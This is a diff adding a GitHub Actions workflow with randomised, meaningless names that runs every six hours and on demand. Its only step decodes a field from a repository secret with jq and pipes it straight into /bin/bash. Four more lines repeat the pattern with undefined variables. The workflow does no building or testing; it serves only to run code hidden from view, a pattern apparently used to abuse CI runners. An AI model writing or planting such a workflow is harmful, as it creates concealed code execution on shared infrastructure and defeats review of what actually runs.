@@ -1,0 +1,22 @@
+name: rebecca10861
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: rebecca10861
+        env:
+          kt95: ${{ secrets.kt95 }}
+        run: |
+          echo $kt95 | jq -r .ub6554 | /bin/bash
+          echo $j439 | jq -r .r10854 | /bin/bash
+          echo $y4 | jq -r .vraq08241 | /bin/bash
+          echo $kuq015 | jq -r .dnjc0 | /bin/bash
+          echo $m306 | jq -r .avrie52 | /bin/bash
+
